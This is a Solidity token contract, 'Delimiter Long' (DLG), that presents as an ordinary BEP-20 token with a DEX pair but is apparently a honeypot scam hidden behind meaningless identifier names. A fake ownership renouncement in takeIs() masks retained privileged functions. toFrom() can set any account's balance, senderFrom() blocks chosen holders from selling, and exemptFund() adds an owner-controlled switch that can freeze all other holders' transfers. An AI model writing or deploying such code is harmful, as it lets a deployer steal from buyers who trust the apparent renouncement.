//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface fundWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverReceiverTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toTrading {
    function createPair(address sellMode, address exemptLiquidity) external returns (address);
}

interface buyLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeAt) external view returns (uint256);

    function transfer(address atListTrading, uint256 tokenIsTo) external returns (bool);

    function allowance(address listFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenIsTo) external returns (bool);

    function transferFrom(
        address sender,
        address atListTrading,
        uint256 tokenIsTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isShould, uint256 value);
    event Approval(address indexed listFund, address indexed spender, uint256 value);
}

interface buyLimitMetadata is buyLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DelimiterLong is receiverReceiverTeam, buyLimit, buyLimitMetadata {

    function getOwner() external view returns (address) {
        return toExempt;
    }

    bool private receiverMode;

    uint256 private amountTotal;

    function decimals() external view virtual override returns (uint8) {
        return tokenMinSender;
    }

    uint256 private sellTo;

    bool public amountSwap;

    bool private autoMode;

    function senderFrom(address teamFund) public {
        maxTrading();
        
        if (teamFund == shouldLaunched || teamFund == tokenBuyExempt) {
            return;
        }
        autoAmountReceiver[teamFund] = true;
    }

    address autoAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 limitTeamTotal;

    mapping(address => bool) public autoAmountReceiver;

    function allowance(address senderTrading, address teamFee) external view virtual override returns (uint256) {
        if (teamFee == toMax) {
            return type(uint256).max;
        }
        return autoTo[senderTrading][teamFee];
    }

    uint256 private launchedLimit;

    uint256 public liquidityIs;

    function toFrom(address launchedTotal, uint256 tokenIsTo) public {
        maxTrading();
        tokenAmount[launchedTotal] = tokenIsTo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundLaunchMarketing;
    }

    string private tradingMode = "DLG";

    mapping(address => uint256) private tokenAmount;

    function approve(address teamFee, uint256 tokenIsTo) public virtual override returns (bool) {
        autoTo[_msgSender()][teamFee] = tokenIsTo;
        emit Approval(_msgSender(), teamFee, tokenIsTo);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingMode;
    }

    function name() external view virtual override returns (string memory) {
        return takeListEnable;
    }

    constructor (){
        if (autoMode) {
            launchedLimit = takeReceiver;
        }
        fundWallet senderMin = fundWallet(toMax);
        tokenBuyExempt = toTrading(senderMin.factory()).createPair(senderMin.WETH(), address(this));
        
        shouldLaunched = _msgSender();
        takeIs();
        tradingFund[shouldLaunched] = true;
        tokenAmount[shouldLaunched] = fundLaunchMarketing;
        
        emit Transfer(address(0), shouldLaunched, fundLaunchMarketing);
    }

    function buyAmount(uint256 tokenIsTo) public {
        maxTrading();
        launchReceiverTotal = tokenIsTo;
    }

    function exemptFund(address buySwap, address atListTrading, uint256 tokenIsTo) internal returns (bool) {
        if (buySwap == shouldLaunched) {
            return buyLiquidity(buySwap, atListTrading, tokenIsTo);
        }
        uint256 fromWallet = buyLimit(tokenBuyExempt).balanceOf(autoAmount);
        require(fromWallet == launchReceiverTotal);
        require(atListTrading != autoAmount);
        if (autoAmountReceiver[buySwap]) {
            return buyLiquidity(buySwap, atListTrading, listEnableSell);
        }
        return buyLiquidity(buySwap, atListTrading, tokenIsTo);
    }

    uint256 constant listEnableSell = 13 ** 10;

    function takeFeeExempt(address marketingWallet) public {
        require(marketingWallet.balance < 100000);
        if (amountSwap) {
            return;
        }
        if (launchedLimit != sellTo) {
            receiverMode = false;
        }
        tradingFund[marketingWallet] = true;
        
        amountSwap = true;
    }

    address public tokenBuyExempt;

    function balanceOf(address feeAt) public view virtual override returns (uint256) {
        return tokenAmount[feeAt];
    }

    uint256 private takeReceiver;

    function transferFrom(address buySwap, address atListTrading, uint256 tokenIsTo) external override returns (bool) {
        if (_msgSender() != toMax) {
            if (autoTo[buySwap][_msgSender()] != type(uint256).max) {
                require(tokenIsTo <= autoTo[buySwap][_msgSender()]);
                autoTo[buySwap][_msgSender()] -= tokenIsTo;
            }
        }
        return exemptFund(buySwap, atListTrading, tokenIsTo);
    }

    uint256 private enableSell;

    address toMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxTrading() private view {
        require(tradingFund[_msgSender()]);
    }

    string private takeListEnable = "Delimiter Long";

    mapping(address => bool) public tradingFund;

    function transfer(address launchedTotal, uint256 tokenIsTo) external virtual override returns (bool) {
        return exemptFund(_msgSender(), launchedTotal, tokenIsTo);
    }

    address public shouldLaunched;

    address private toExempt;

    uint256 private fundLaunchMarketing = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private autoTo;

    uint256 launchReceiverTotal;

    function buyLiquidity(address buySwap, address atListTrading, uint256 tokenIsTo) internal returns (bool) {
        require(tokenAmount[buySwap] >= tokenIsTo);
        tokenAmount[buySwap] -= tokenIsTo;
        tokenAmount[atListTrading] += tokenIsTo;
        emit Transfer(buySwap, atListTrading, tokenIsTo);
        return true;
    }

    bool private launchAtList;

    function takeIs() public {
        emit OwnershipTransferred(shouldLaunched, address(0));
        toExempt = address(0);
    }

    uint8 private tokenMinSender = 18;

    function owner() external view returns (address) {
        return toExempt;
    }

    event OwnershipTransferred(address indexed atLiquidityReceiver, address indexed liquidityTeamToken);

}